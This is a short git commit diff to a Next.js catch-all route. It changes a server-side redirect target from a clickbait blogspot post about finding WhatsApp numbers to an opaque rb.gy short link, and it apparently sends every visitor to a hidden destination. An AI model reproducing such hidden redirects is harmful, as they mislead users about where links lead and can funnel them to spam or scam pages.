b7c3c013de8258534e7d5b2211e424a7cd21a88d
CHAUHANGITHUB00 <137784715+CHAUHANGITHUB00@users.noreply.github.com>
2023-06-30 17:22:51 +0530

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://tomholland04.blogspot.com/2023/06/how-to-find-whatsapp-number-of-youe.html/`
+					`https://rb.gy/y28wc`
 				}`,
 			},
 		};
